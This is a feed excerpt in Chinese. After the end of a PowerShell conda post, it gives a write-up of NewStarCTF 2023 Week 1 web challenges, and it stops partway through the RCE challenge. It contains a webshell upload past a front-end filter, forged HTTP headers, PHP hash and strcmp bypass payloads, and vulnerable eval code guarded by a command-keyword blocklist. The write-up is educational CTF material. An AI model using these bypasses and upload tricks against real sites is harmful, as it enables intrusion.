&lt;pre data-lang=&quot;powershell&quot; class=&quot;language-powershell z-code&quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-powershell&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-interpolated z-simple z-source z-powershell&quot;&gt;base&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-powershell&quot;&gt;)&lt;&#x2F;span&gt; PS C:\Users\HP&lt;span class=&quot;z-keyword z-operator z-redirection z-powershell&quot;&gt;&amp;gt;&lt;&#x2F;span&gt; conda activate dl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-powershell&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-powershell&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-interpolated z-simple z-source z-powershell&quot;&gt;dl&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-powershell&quot;&gt;)&lt;&#x2F;span&gt; PS C:\Users\HP&lt;span class=&quot;z-keyword z-operator z-redirection z-powershell&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;参考：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;47800794&#x2F;how-to-activate-different-anaconda-environment-from-powershell?rq=1&quot;&gt;stackOverflow&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;dereen&#x2F;p&#x2F;ps_conda_env.html&quot;&gt;cnblogs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_42951560&#x2F;article&#x2F;details&#x2F;123859735&quot;&gt;powershell问题&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;!-- [^1]: First footnote. --&gt;</content>
	</entry>
	<entry xml:lang="zh">
		<title>NewStarCTF wp</title>
		<published>2023-04-15T00:00:00+00:00</published>
		<updated>2025-06-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/litctf/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/litctf/</id>
		<content type="html">&lt;h1 id=&quot;newstarctf-2023&quot;&gt;NewStarCTF 2023&lt;a class=&quot;zola-anchor&quot; href=&quot;#newstarctf-2023&quot; aria-label=&quot;Anchor link for: newstarctf-2023&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;web&quot;&gt;Web&lt;a class=&quot;zola-anchor&quot; href=&quot;#web&quot; aria-label=&quot;Anchor link for: web&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;week-1-xie-lou-de-mi-mi&quot;&gt;[Week 1]泄漏的秘密&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-xie-lou-de-mi-mi&quot; aria-label=&quot;Anchor link for: week-1-xie-lou-de-mi-mi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;注意，此部分图床已坏&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过使用 dirsearch 扫描可以得到两个文件可访问 &lt;code&gt;robots.txt&lt;&#x2F;code&gt; 和 &lt;code&gt;www.zip&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;robots.txt 内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;PART ONE: flag{r0bots_1s_s0_us3ful
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;www.zip&#x2F;index.php 内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$PART_TWO = &amp;quot;_4nd_www.zip_1s_s0_d4ng3rous}&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo &amp;quot;&amp;lt;h1&amp;gt;粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&amp;lt;&#x2F;h1&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-begin-of-upload&quot;&gt;[Week 1]Begin of Upload&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-begin-of-upload&quot; aria-label=&quot;Anchor link for: week-1-begin-of-upload&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过查看源代码可以发现使用的是前端过滤，通过在浏览器中禁止 JavaScript 后即可直接上传 shell 文件。&lt;&#x2F;p&gt;
&lt;p&gt;通过蚁剑一把梭即可得到 flag（文件在 &#x2F;fllll4g）。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-begin-of-http&quot;&gt;[Week 1]Begin of HTTP&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-begin-of-http&quot; aria-label=&quot;Anchor link for: week-1-begin-of-http&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;0x00-get&quot;&gt;&lt;strong&gt;0x00 GET&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x00-get&quot; aria-label=&quot;Anchor link for: 0x00-get&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;请使用 GET方式 来给 ctf 参数传入任意值来通过这关
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 param 传入 ctf 参数即可，如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;http:&#x2F;&#x2F;node4.buuoj.cn:29844&#x2F;?ctf=123
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x01-post&quot;&gt;&lt;strong&gt;0x01 POST&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x01-post&quot; aria-label=&quot;Anchor link for: 0x01-post&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看源代码可以发现&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 base64 解密可以得到 Secret 值为 &lt;code&gt;n3wst4rCTF2023g00000d&lt;&#x2F;code&gt; ，通过 body 传入即可。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;secret=n3wst4rCTF2023g00000d
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x02-cookie&quot;&gt;&lt;strong&gt;0x02 Cookie&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x02-cookie&quot; aria-label=&quot;Anchor link for: 0x02-cookie&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置 Cookie 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Cookie: power=ctfer
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x03-user-agent&quot;&gt;&lt;strong&gt;0x03 User-Agent&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x03-user-agent&quot; aria-label=&quot;Anchor link for: 0x03-user-agent&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置 User-Agent 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;User-Agent: NewStarCTF2023
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x04-referer&quot;&gt;&lt;strong&gt;0x04 Referer&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x04-referer&quot; aria-label=&quot;Anchor link for: 0x04-referer&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;希望你是从 newstarctf.com 访问到这个关卡的
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置 Referer 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Referer: newstarctf.com
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x05-x-real-ip&quot;&gt;&lt;strong&gt;0x05 X-Real-Ip&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x05-x-real-ip&quot; aria-label=&quot;Anchor link for: 0x05-x-real-ip&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;最后一关了！只有 本地用户 可以通过这一关
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置 X-Real-Ip 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;X-Real-Ip: 127.0.0.1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;就可以得到 flag 了。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-1-errorflask&quot;&gt;[Week 1]ErrorFlask&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-errorflask&quot; aria-label=&quot;Anchor link for: week-1-errorflask&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过题目得知需要从 Flask 中的报错中寻找答案，网页回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;give me number1 and number2,i will help you to add
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过输入字符串类型的值即可得到报错，Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?number1=a&amp;amp;number2=b
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到回显后点击 &lt;code&gt;return &quot;not ssti,flag in source code~&quot;+str(int(num1)+int(num2))&lt;&#x2F;code&gt; 即可得到 flag ，不方便复制可以 F12 来复制。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag = &amp;quot;flag{Y0u_@re_3enset1ve_4bout_deb8g}&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-begin-of-php&quot;&gt;[Week 1]Begin of PHP&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-begin-of-php&quot; aria-label=&quot;Anchor link for: week-1-begin-of-php&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;error_reporting(0);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if(isset($_GET[&amp;#39;key1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;key2&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;=Level 1=&amp;lt;br&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if($_GET[&amp;#39;key1&amp;#39;] !== $_GET[&amp;#39;key2&amp;#39;] &amp;amp;&amp;amp; md5($_GET[&amp;#39;key1&amp;#39;]) == md5($_GET[&amp;#39;key2&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $flag1 = True;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(&amp;quot;nope,this is level 1&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if($flag1){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;=Level 2=&amp;lt;br&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if(isset($_POST[&amp;#39;key3&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(md5($_POST[&amp;#39;key3&amp;#39;]) === sha1($_POST[&amp;#39;key3&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            $flag2 = True;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(&amp;quot;nope,this is level 2&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if($flag2){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;=Level 3=&amp;lt;br&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if(isset($_GET[&amp;#39;key4&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(strcmp($_GET[&amp;#39;key4&amp;#39;],file_get_contents(&amp;quot;&#x2F;flag&amp;quot;)) == 0){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            $flag3 = True;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            die(&amp;quot;nope,this is level 3&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if($flag3){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;=Level 4=&amp;lt;br&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if(isset($_GET[&amp;#39;key5&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(!is_numeric($_GET[&amp;#39;key5&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;key5&amp;#39;] &amp;gt; 2023){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            $flag4 = True;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            die(&amp;quot;nope,this is level 4&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if($flag4){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;=Level 5=&amp;lt;br&amp;gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    extract($_POST);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    foreach($_POST as $var){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(preg_match(&amp;quot;&#x2F;[a-zA-Z0-9]&#x2F;&amp;quot;,$var)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            die(&amp;quot;nope,this is level 5&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if($flag5){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        echo file_get_contents(&amp;quot;&#x2F;flag&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(&amp;quot;nope,this is level 5&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x00-level-1&quot;&gt;&lt;strong&gt;0x00 Level 1&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x00-level-1&quot; aria-label=&quot;Anchor link for: 0x00-level-1&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;md5 绕过，可以通过数组进行绕过，Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key1[]=1&amp;amp;key2[]=2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x01-level-2&quot;&gt;&lt;strong&gt;0x01 Level 2&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x01-level-2&quot; aria-label=&quot;Anchor link for: 0x01-level-2&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;md5 === sha1 绕过，同样可以通过数组进行绕过，Payload 如下（Level 5 中不允许 POST 的值出现任何数字或字母）&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key3[]=@
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x02-level-3&quot;&gt;&lt;strong&gt;0x02 Level 3&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x02-level-3&quot; aria-label=&quot;Anchor link for: 0x02-level-3&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;strcmp 函数绕过，同样可以通过数组进行绕过，Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key1[]=1&amp;amp;key2[]=2&amp;amp;key4[]=4
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x03-level-4&quot;&gt;&lt;strong&gt;0x03 Level 4&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x03-level-4&quot; aria-label=&quot;Anchor link for: 0x03-level-4&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;is_numeric 函数绕过，将 key5 设置为 2024a(任意字符) 即可，Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key1[]=1&amp;amp;key2[]=2&amp;amp;key4[]=4&amp;amp;key5=2024a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x04-level-5&quot;&gt;&lt;strong&gt;0x04 Level 5&lt;&#x2F;strong&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x04-level-5&quot; aria-label=&quot;Anchor link for: 0x04-level-5&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;code&gt;extract($_POST);&lt;&#x2F;code&gt; 函数相当于 &lt;code&gt;$name = $_POST[&#x27;name&#x27;]&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;通过发现缺少了 flag5 变量，说明就需要通过以上方法来造出 flag5，又因为 POST 的值出现任何数字或字母，根据在 PHP 中，只要字符串不为空即为 &lt;code&gt;True&lt;&#x2F;code&gt; 的特性，故 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key3[]=@&amp;amp;flag5=@
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-1-r-c-e&quot;&gt;[Week 1]R!C!E!&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-r-c-e&quot; aria-label=&quot;Anchor link for: week-1-r-c-e&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if(isset($_POST[&amp;#39;password&amp;#39;])&amp;amp;&amp;amp;isset($_POST[&amp;#39;e_v.a.l&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $password=md5($_POST[&amp;#39;password&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    $code=$_POST[&amp;#39;e_v.a.l&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if(substr($password,0,6)===&amp;quot;c4d038&amp;quot;){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(!preg_match(&amp;quot;&#x2F;flag|system|pass|cat|ls&#x2F;i&amp;quot;,$code)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            eval($code);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;本题需要知道 GET 或 POST 变量名中的非法字符会转化下划线，即 &lt;code&gt;$_POST[&#x27;e_v.a.l&#x27;]&lt;&#x2F;code&gt; 需要通过 &lt;code&gt;e[.v.a.l&lt;&#x2F;code&gt; 来传入。&lt;&#x2F;p&gt;
&lt;p&gt;并且题目中还存在一个 password，该参数会进行 md5 加密并对比前 6 位需要与 &lt;code&gt;c4d038&lt;&#x2F;code&gt; 一致，可以通过写脚本进行爆破。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import hashlib
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(0, 99999999):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if hashlib.md5(str(i).encode(encoding=&amp;#39;utf-8&amp;#39;)).hexdigest()[:6] == &amp;quot;c4d038&amp;quot;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(i)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        break
